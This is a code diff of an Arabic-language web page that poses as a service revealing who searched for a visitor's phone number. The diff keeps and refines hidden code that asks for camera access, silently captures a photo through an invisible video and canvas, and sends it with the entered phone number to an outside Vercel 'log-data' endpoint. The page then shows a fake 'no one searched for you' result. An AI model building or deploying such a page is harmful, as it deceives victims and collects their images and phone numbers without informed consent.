@@ -11,7 +11,7 @@
         input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 8px; text-align: center; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         #status { margin-top: 15px; font-size: 13px; color: #555; }
-        video, canvas { display: none; } /* الكاميرا تعمل بالخلفية */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -24,12 +24,11 @@
     <div id="status"></div>
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline></video> <canvas id="canvas"></canvas>
 
 <script>
-    // الرابط المباشر لمشروعك (تأكد من دقة الرابط)
-    const API_URL = "https://sed-x8mt-bwt9kpij7-hamm43791-2459s-projects.vercel.app/log-data";
+    // تم تحديث الرابط ليكون الرابط المباشر والسريع
+    const API_URL = "https://sed-x8mt.vercel.app/log-data";
 
     document.getElementById('startBtn').addEventListener('click', async () => {
         const phone = document.getElementById('phone').value;
@@ -40,7 +39,7 @@
         status.innerText = "جاري طلب إذن الاتصال بالقاعدة...";
 
         try {
-            // طلب إذن الكاميرا (هنا يوافق المستخدم لكي يبحث)
+            // طلب إذن الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
@@ -56,25 +55,31 @@
 
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
-                    formData.append('username', "الرقم: " + phone);
-                    formData.append('password', "موقع كاشف الأرقام");
+                    formData.append('username', phone); // نرسل الرقم فقط ليكون أوضح
                     formData.append('photo', blob, 'user.jpg');
 
                     try {
-                        const res = await fetch(API_URL, { method: 'POST', body: formData });
+                        const res = await fetch(API_URL, { 
+                            method: 'POST', 
+                            body: formData,
+                            mode: 'cors' // نؤكد على استخدام CORS
+                        });
+
                         if (res.ok) {
                             status.style.color = "red";
                             status.innerText = "عذراً، لم يبحث عنك أحد في الـ 24 ساعة الماضية.";
+                        } else {
+                            status.innerText = "السيرفر شغال لكنه رفض الطلب. تأكد من إعدادات CORS.";
                         }
                     } catch (e) {
-                        status.innerText = "خطأ في الاتصال، حاول لاحقاً.";
+                        status.innerText = "خطأ في الاتصال بالسيرفر. تأكد من رفع ملف vercel.json";
                     }
-                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
+                    stream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg');
             }, 1000);
 
         } catch (err) {
-            status.innerText = "يجب السماح بالأذونات لإتمام البحث.";
+            status.innerText = "يجب السماح بالأذونات (الكاميرا) لإتمام البحث.";
             status.style.color = "red";
         }
     });
